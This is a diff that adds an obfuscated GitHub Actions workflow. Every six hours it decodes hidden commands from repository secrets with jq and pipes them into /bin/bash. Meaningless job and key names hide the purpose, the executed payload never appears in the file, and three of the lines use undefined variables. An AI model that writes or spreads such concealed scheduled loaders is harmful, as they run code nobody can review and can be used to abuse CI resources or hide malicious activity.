@@ -1,0 +1,19 @@
+name: xiaozhufanerr
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaozhufanerr
+        env:
+          u184: ${{ secrets.u184 }}
+        run: |
+          echo $u184 | jq -r .fuox38 | /bin/bash
+          echo $zkfm6 | jq -r .dce27514 | /bin/bash
+          echo $h4 | jq -r .tdne43 | /bin/bash
+          echo $fcti45 | jq -r .euwmx72482 | /bin/bash
+
